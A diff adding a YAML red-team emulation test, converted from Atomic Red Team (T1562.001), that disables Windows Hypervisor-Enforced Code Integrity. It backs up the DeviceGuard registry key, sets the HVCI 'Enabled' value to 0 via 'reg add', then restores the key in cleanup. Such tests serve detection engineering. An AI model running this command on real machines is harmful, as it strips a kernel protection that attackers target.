@@ -1,0 +1,52 @@
+# Converted from Atomic Red Team - Impair Defenses: Disable or Modify Tools
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1562.001
+# Original auto_generated_guid: 70bd71e6-eba4-4e00-92f7-617911dbe020
+
+---
+api_version: 2.0
+uuid: 22337df0-48cb-4dde-9e10-469439294646
+name: Disable Hypervisor-Enforced Code Integrity (HVCI)
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity "Enabled" value to "0".
+  The pre-req needs to be ran in order to setup HVCI and have it enabled.
+  We do not recommend running this in production.
+  Black Lotus Campaign: https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/
+  Microsoft: https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity
+
+mitre:
+  tactics:
+    - "TA0005 Defense Evasion"
+  techniques:
+    - "T1562 Impair Defenses"
+  subtechniques:
+    - "T1562.001 Disable or Modify Tools"
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: true
+
+args:
+  - name: backup_location
+    description: Path where registry backup will be saved
+    type: path
+    default: "C:\\Users\\Public\\backup.reg"
+
+steps:
+  - name: backup_registry
+    executor: cmd.exe
+    inline: |
+      reg export "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" "{{.Args.backup_location}}" /y 2>nul
+
+  - name: disable_hvci
+    executor: powershell
+    inline: |
+      reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Enabled" /t REG_DWORD /d 0 /f
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg import "{{.Args.backup_location}}" 2>nul
+        del "{{.Args.backup_location}}" /f /q 2>nul
